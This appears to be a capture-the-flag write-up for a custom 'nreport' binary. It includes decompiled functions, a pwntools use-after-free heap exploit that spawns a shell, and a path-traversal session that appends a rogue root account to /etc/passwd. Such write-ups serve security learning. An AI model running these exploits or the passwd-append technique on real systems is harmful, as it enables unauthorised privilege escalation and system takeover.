### reverse it

The binary nreport has several functions.
#### main

Open the binary in IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int result; // eax
  char nptr[3]; // [rsp+15h] [rbp-Bh] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  puts("Custom Reporting v1\n");
  auth();
  printf("\nWelcome %s", userinfo1);
  do
  {
    puts("\n1.Create New Message\n2.Delete a Message\n3.Edit Messages\n4.Report All Messages\n5.Exit");
    printf("> ");
    __isoc99_scanf(" %1[^\n]", nptr);
    v3 = atoi(nptr);
  }
  while ( v3 > 5 );
  __asm { jmp     rax }
  return result;
}
```

Open the binary in Ghidra

```c
void main(void)

{
  int in_int;
  long FS;
  char in_str [3];
  int canary;
  
  canary = *(undefined8 *)(FS + 0x28);
  puts("Custom Reporting v1\n");
  auth();
  printf("\nWelcome %s",userinfo1);
  do {
    puts(
        "\n1.Create New Message\n2.Delete a Message\n3.Edit Messages\n4.Report All Messages\n5.Exit"
        );
    printf("> ");
    __isoc99_scanf(" %1[^\n]",in_str);
    in_int = atoi(in_str);
    switch(in_int) {
    case 1:
      create();
      break;
    case 2:
      delete();
      break;
    case 3:
      edit();
      break;
    case 4:
      report();
      break;
    case 5:
      system(userinfo1 + 0x28);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

#### auth

```c
__int64 auth()
{
  int i; // [rsp+Ch] [rbp-44h]
  __int64 v2; // [rsp+10h] [rbp-40h]
  __int64 v3; // [rsp+18h] [rbp-38h]
  __int64 v4; // [rsp+20h] [rbp-30h]
  __int64 v5; // [rsp+28h] [rbp-28h]
  __int64 v6; // [rsp+30h] [rbp-20h]
  __int64 v7; // [rsp+38h] [rbp-18h]
  __int64 v8; // [rsp+40h] [rbp-10h]
  unsigned __int64 v9; // [rsp+48h] [rbp-8h]

  v9 = __readfsqword(40u);
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  printf("Enter Your Token: ");
  fgets(&byte_4041F8, 19, stdin);
  if ( strlen(&byte_4041F8) != 15 )
  {
    puts("Invalid Token");
    exit(0);
  }

  for ( i = 13; i >= 0; --i )
    *((_DWORD *)&v2 + i) = byte_404205 ^ byte_404201 ^ byte_4041F8 ^ byte_4041FA ^ byte_4041F9 ^ secret[i];

  if ( HIDWORD(v2) + (_DWORD)v2 + (_DWORD)v3 != 308 )
  {
    puts("Invalid Token");
    exit(0);
  }
  if ( (_DWORD)v6 + HIDWORD(v5) + HIDWORD(v6) != 325 ) 
  {
    puts("Invalid Token");
    exit(0);
  }
  if ( (_DWORD)v8 + HIDWORD(v7) + HIDWORD(v8) != 265 )
  {
    puts("Invalid Token");
    exit(0);
  }
  printf("Enter Name: ");
  __isoc99_scanf(" %39[^\n]", userinfo1);
  strcpy(dest, "/opt/crv1/");
  strcat(dest, userinfo1);
  strcpy((char *)&qword_4041A8, "echo \"Last Used On $(date)\" >> /var/log/kreport");
  return 0x2F676F6C2F726176LL;
}
```

#### create

```c
__int64 create()
{
  char *v1; // [rsp+8h] [rbp-8h]

  printf("\nYou can only create 10 messages at a time\nMessages Created: %i\n\n", (unsigned int)Arryindex);
  v1 = (char *)calloc(1uLL, 0xA1uLL);
  printf("Message Title: ");
  __isoc99_scanf(" %59[^\n]", v1);
  printf("Message: ");
  __isoc99_scanf(" %100[^\n]", v1 + 60);
  message_array[Arryindex] = v1;
  return (unsigned int)++Arryindex;
}
```

#### delete

```c
unsigned __int64 delete()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Message number to delete: ");
  __isoc99_scanf("%d[^\n]", &v1);
  free((void *)message_array[v1]);
  --Arryindex;
  puts("\nMessage Deleted");
  return __readfsqword(0x28u) ^ v2;
}
```

#### edit

```c
unsigned __int64 edit()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( Arryindex )
  {
    printf("Enter number to edit: ");
    __isoc99_scanf("%d[^\n]", &v1);
    printf("Message Title: ");
    __isoc99_scanf(" %59[^\n]", message_array[v1]);
    printf("Message: ");
    __isoc99_scanf("%100[^\n]", message_array[v1] + 60LL);
    fflush(stdin);
    fflush(stdout);
  }
  else
  {
    puts("No Message Created");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

#### report

```c
unsigned __int64 report()
{
  int v1; // [rsp+4h] [rbp-1Ch] BYREF
  int v2; // [rsp+8h] [rbp-18h] BYREF
  int i; // [rsp+Ch] [rbp-14h]
  FILE *stream; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  stream = fopen(dest, "a");
  puts("1.Report Specific Message");
  puts("2.Report All Messages");
  printf("> ");
  __isoc99_scanf("%d", &v1);
  if ( v1 == 1 )
  {
    printf("Index: ");
    __isoc99_scanf("%d", &v2);
    if ( v2 > Arryindex )
      printf("Invalid Index");
    fprintf(stream, "%s ", (const char *)(message_array[v2] + 60LL));
    fprintf(stream, "%s\n", (const char *)message_array[v2]);
    printf("File stored At: %s\n", dest);
  }
  else if ( v1 == 2 )
  {
    for ( i = 0; i < Arryindex; ++i )
    {
      fprintf(stream, "%s ", (const char *)(message_array[i] + 60LL));
      fprintf(stream, "%s\n", (const char *)message_array[i]);
    }
    printf("File stored At: %s\n", dest);
  }
  else
  {
    puts("Invalid Option");
  }
  fclose(stream);
  return __readfsqword(0x28u) ^ v5;
}
```

### official way

- create a fake heap chunk pointing another fake chunk further down to the point of the shell command inside the userinfo1 structure
- leverage our control over the username portion of the userinfo1 structure
- exploit the UAF bug, we can set the backward pointer to point to our chunk inside the userinfo1 structure. 
- create two more messages, the malicious chunk will be allocated and then we can overwrite the shell command and execute a shell

```python
from pwn import *

elf = context.binary = ELF("./nreport")
libc = elf.libc

p = process('./nreport')
p.sendline(b"00sxxxxxxaxxxa")
p.sendline(p64(0)+p64(0xb0)+p64(0)+p64(elf.sym.userinfo1)) # fake chunk
# create 0
p.sendline(b"1")
p.sendline(b"this is a title")
p.sendline(b"this is a Message")
# create 1
p.sendline(b"1")
p.sendline(b"this is title 2")
p.sendline(b"this is the second Message")
# delete 0
p.sendline(b"2")
p.sendline(b"0")
# edit 0; UAF
p.sendline(b"3")
p.sendline(b'0')
p.sendline(p64(0)+p64(elf.sym.userinfo1)) # fd, bk
p.sendline(b"test")
# create
p.sendline(b"1")
p.sendline(b"test")
p.sendline(b"test"*36)
# create
p.sendline(b"1")
p.sendline(b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7/bin/sh\x00") # offset 40-16=24
p.sendline(b"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC")
#gdb.attach(p)
# exit
p.sendline(b"5")
p.interactive()
```

### another way: Arbitrary File Write(append mode)
We can exploit report function to get privilege escalation

```c
stream = fopen(dest, "a");
......
printf("Index: ");
    __isoc99_scanf("%d", &v2);
    if ( v2 > Arryindex )
      printf("Invalid Index");
    fprintf(stream, "%s ", (const char *)(message_array[v2] + 60LL));
    fprintf(stream, "%s\n", (const char *)message_array[v2]);
    printf("File stored At: %s\n", dest);
  }
```

```bash
# ./nreport 
Custom Reporting v1

Enter Your Token: aaaxxxxxxaxxxs
Enter Name: ../../etc/passwd

Welcome ../../etc/passwd
1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
> 1

You can only create 10 messages at a time
Messages Created: 0

Message Title: root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/sh
Message: hello

1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
> 4
1.Report Specific Message
2.Report All Messages
> 1
Index: 0
File stored At: /opt/crv1/../../etc/passwd

1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit

# cat /etc/passwd
......
daemon:x:1:1::/usr/sbin:/usr/sbin/nologin
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
uuidd:x:135:146::/run/uuidd:/usr/sbin/nologin
redis:x:136:147::/var/lib/redis:/usr/sbin/nologin
hello root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/sh

# su "hello root2"
```
